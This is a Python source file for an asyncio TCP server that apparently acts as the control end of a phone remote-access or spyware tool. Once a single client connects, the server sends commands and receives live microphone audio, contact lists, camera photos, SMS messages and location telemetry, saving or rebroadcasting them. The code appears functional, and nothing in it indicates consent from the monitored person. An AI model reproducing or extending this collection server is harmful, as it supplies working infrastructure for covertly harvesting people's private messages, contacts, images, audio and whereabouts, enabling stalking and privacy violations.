import asyncio
import json
import socket
from typing import Any, Dict

from app.audio.broadcaster import broadcast_audio
from app.config import settings
from app.logger import log_error, log_info, log_warn
from app.protocol import recv_frame
from app.state import state
from app.tcp.commands import send_command
from app.tcp.dispatcher import fail_all_pending, resolve_pending
from app.tcp.handlers import (
    process_cams_data,
    process_sms_data,
    process_telemetry_data,
    save_contacts_data,
    save_photo_data,
)


async def reader_loop(reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> None:
    try:
        while state.client_connected():
            try:
                frame = await recv_frame(reader)
            except (
                asyncio.IncompleteReadError,
                ConnectionResetError,
                BrokenPipeError,
                asyncio.CancelledError,
            ):
                break
            except Exception as e:
                log_warn(f"tcp connection closed: {e}")
                break

            try:
                header = json.loads(frame.decode("utf-8"))
            except Exception as e:
                log_warn(f"invalid json frame: {e}")
                continue

            msg_type = header.get("type")

            if msg_type == "mic_chunk":
                try:
                    audio_data = await recv_frame(reader)
                    if state.mic_active:
                        await broadcast_audio(audio_data)
                except Exception as e:
                    log_warn(f"mic frame read interrupted: {e}")
                    break

            elif msg_type == "contacts":
                try:
                    data = await recv_frame(reader)
                    path = save_contacts_data(data)
                    resolve_pending(
                        "contacts", {"status": "ok" if path else "failed", "path": path}
                    )
                except Exception as e:
                    log_error(f"contacts read failed: {e}")
                    resolve_pending("contacts", {"status": "failed", "path": None})

            elif msg_type == "camera_capture":
                try:
                    data = await recv_frame(reader)
                    if settings.enable_camera:
                        cam_id = header.get("cam_id", "0")
                        path = save_photo_data(str(cam_id), data)
                        resolve_pending(
                            "camera_capture", {"status": "ok" if path else "failed", "path": path}
                        )
                    else:
                        resolve_pending(
                            "camera_capture",
                            {"status": "disabled", "message": "Camera feature is disabled", "path": None},
                        )
                except Exception as e:
                    log_error(f"camera capture read failed: {e}")
                    resolve_pending("camera_capture", {"status": "failed", "path": None})

            elif msg_type == "sms":
                messages = header.get("data", [])
                hours = header.get("hours", 24)
                res = process_sms_data(messages, hours)
                resolve_pending("sms", {"status": "ok", "data": res})

            elif msg_type == "cams":
                if settings.enable_camera:
                    cams = header.get("data", [])
                    res = process_cams_data(cams)
                    resolve_pending("cams", {"status": "ok", "data": res})
                else:
                    resolve_pending(
                        "cams",
                        {"status": "disabled", "message": "Camera feature is disabled", "data": []},
                    )

            elif msg_type == "telemetry":
                res = process_telemetry_data(header)
                resolve_pending("telemetry", {"status": "ok", "data": res})

            elif msg_type == "error":
                msg = header.get("message", "unknown error")
                log_warn(f"client reported: {msg}")
                cmd = header.get("cmd")
                msg_lower = msg.lower()
                if "mic" in msg_lower or "audio" in msg_lower or cmd == "mic":
                    state.mic_active = False

                target_key = cmd
                if not target_key:
                    if "contact" in msg_lower:
                        target_key = "contacts"
                    elif "sms" in msg_lower:
                        target_key = "sms"
                    elif "telemetry" in msg_lower or "location" in msg_lower:
                        target_key = "telemetry"
                    elif "cam" in msg_lower or "photo" in msg_lower or "picture" in msg_lower:
                        target_key = "camera_capture"
                        resolve_pending("cams", {"status": "error", "message": msg, "data": []})

                if target_key:
                    resolve_pending(
                        target_key,
                        {"status": "error", "message": msg, "data": None, "path": None},
                    )
    finally:
        fail_all_pending(ConnectionResetError("client disconnected"))
        writer = state.client_writer
        state.clear_client()
        if writer:
            try:
                writer.close()
                await writer.wait_closed()
            except Exception:
                pass
        log_info("client disconnected")


async def client_session(reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> None:
    addr = writer.get_extra_info("peername")
    state.client_reader = reader
    state.client_writer = writer
    state.client_addr = addr
    state.disconnect_event.clear()
    log_info(f"client connected from {addr}")
    await send_command({"cmd": "connected"})
    await reader_loop(reader, writer)


async def tcp_client_handler(reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> None:
    sock = writer.get_extra_info("socket")
    if sock:
        try:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        except Exception:
            pass

    if state.client_connected():
        writer.close()
        await writer.wait_closed()
        return
    await client_session(reader, writer)


async def start_tcp_server_action() -> Dict[str, Any]:
    if state.listening:
        return {"status": "already_listening"}
    try:
        server = await asyncio.start_server(tcp_client_handler, settings.tcp_host, settings.tcp_port)
        state.tcp_server = server
        state.listening = True
        log_info(f"TCP server listening on {settings.tcp_host}:{settings.tcp_port}")
        return {"status": "started", "host": settings.tcp_host, "port": settings.tcp_port}
    except OSError as e:
        log_error(f"failed to bind TCP port {settings.tcp_port}: {e}")
        return {"status": "error", "message": str(e)}
    except Exception as e:
        log_error(f"failed to start TCP server: {e}")
        return {"status": "error", "message": str(e)}


async def stop_tcp_server_action() -> Dict[str, str]:
    if not state.listening:
        return {"status": "not_listening"}
    server = state.tcp_server
    if server:
        server.close()
        await server.wait_closed()
        state.tcp_server = None
        state.listening = False
    if state.client_writer:
        try:
            state.client_writer.close()
            await state.client_writer.wait_closed()
        except Exception:
            pass
        state.clear_client()
    log_info("TCP server stopped")
    return {"status": "stopped"}
